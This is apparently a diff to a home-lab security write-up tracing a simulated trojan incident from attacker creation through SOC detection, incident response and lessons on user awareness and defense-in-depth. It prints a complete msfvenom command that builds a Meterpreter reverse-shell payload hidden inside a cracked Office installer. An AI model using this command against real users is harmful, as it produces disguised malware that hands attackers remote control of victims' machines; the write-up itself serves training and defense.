@@ -66,19 +66,48 @@
 
 ---
 
-## 3. Identifying Suspicious Activity
+## 3. Case Study: Trojan Horse via Pirated Software Distribution
 
 ### 3.1.Incident Walkthrough: Backdoor & Persistence
 
 * **Phase 1: Attacker POV (Creation & Hosting)**
 
-A backdoor payload was created using MSFvenom: `sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.251.3 LPORT=4444 --platform windows -a x64 -f exe -o MS_Office_Free.exe`. It was hosted on a pirate website, waiting for the victim to download and open the setup file.
+A backdoor payload was created using MSFvenom and injected to the cracked Microsoft Office setup installer: `sudo msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.251.3 LPORT=4444 --platform windows -a x64 -x /home/kali/Office.exe -k -f exe -o MS_Office_Free.exe`. It was hosted on free software download website, waiting for the victim to download and run the setup file.
+
+![kali](./screenshots/kali1.png)
 
 * **Phase 2: User POV (Infection & Persistence)**
 
-Bob, a standard user, wanted a free MS Office and downloaded the file from "pirate" site. He ignored the Windows Defender warnings and ran the installer. But nothing happened. He thought the installer was "broken." In the background, the Trojan established a backdoor. Persistence was setup by the attacker after received a remote connection.
+Bob, a standard user, wanted a free MS Office and downloaded the file from "pirate" site. He ignored the Windows Defender warnings and ran the installer. But nothing happened. He thought the installer was "broken." In the background, the Trojan established a backdoor that leads the atttacker to set persistence after successfuly receiving a remote connection.
+
+![kali](./screenshots/kali2.png)
+
+[HTML](./folder/index.html)
  
-## 3.2.Backdoor Detection
+* **Phase 3: SOC Analyst POV (Detection & Response)**
 
+During a routine sweep of the endpoint using Process Explorer, a suspicious activity is detected. A process was running under explorer.exe that showed significant outbound network traffic. In the TCP/IP tab, a connection is established to a remote IP (192.168.251.3) on port 4444. The file hash is submitted to VirusTotal, which confirmed the file as a Meterpreter Trojan. Escalated to the Incident Response (IR) Team for immediate containment.
 
+![win](./screenshots/win9.png)
 
+* **Phase 4: Incident Response Team (Response & Remediation)**
+
+To prevent the attacker from moving laterally through the network, the IR team immediately suspended the malicious process and isolated the workstation. The malicious process was killed. The IR team identified and deleted a hidden Scheduled Task that was set to re-execute the malware every hour. The source Trojan (MS_Office_Free.exe) was quarantined and deleted. the user's (Bob's) credentials were reset to ensure the attacker could not return using stolen passwords.
+
+![win](./screenshots/win10.png)
+
+### 3.2.Key Lesson
+
+* **Social Engineering as an Entry Vector**
+
+The use of a high-fidelity 2026 phishing page—featuring fake "Verified" badges and "User Feedback"—successfully manipulated the user into manually disabling their own security. User Awareness Training is the primary defense against such deceptive "Pro Tips" that instruct users to ignore security alerts.
+
+* **Defense-in-Depth**
+
+A single layer of security is insufficient. A robust defense strategy must include:
+
+1.Endpoint Detection & Response (EDR): To monitor process behavior in real-time.
+
+2.Network Filtering: To block known malicious ports and unauthorized external IPs.
+
+3.Least Privilege: Ensuring standard users like "Bob" do not have administrative rights to run unauthorized installers or modify system-level persistence.
